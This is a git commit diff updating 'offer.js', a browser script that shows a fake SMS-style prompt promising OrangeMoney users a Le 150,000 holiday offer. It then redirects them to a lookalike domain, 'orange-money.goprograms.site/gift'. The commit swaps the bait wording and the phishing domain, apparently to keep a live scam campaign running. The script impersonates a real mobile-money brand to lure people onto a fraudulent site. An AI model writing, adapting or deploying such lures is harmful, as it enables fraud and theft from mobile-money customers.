4279e27b3d67f043f992ba1398ee7c44a135b504
kenycruzk <kenycruzk@gmail.com>
2026-04-24 10:57:12 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,7 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'Le 150,000'
-password=prompt('SMS: Congratulations Your OrangeMoney Account is Eligible to receive Le 150,000 Anniversary Day Celebration Offer, Kindly Press OK to PROCEED   ','Le 150,000');
+password=prompt('SMS: Congratulations Your OrangeMoney Account is Eligible to receive Le 150,000 Independence Day Celebration Offer, Kindly Press OK to PROCEED   ','Le 150,000');
 if (password != 'Le 150,000') {
-location.href='https://orange-sl.offer-it.xyz/gift';
+location.href='https://orange-money.goprograms.site/gift';
 }
 
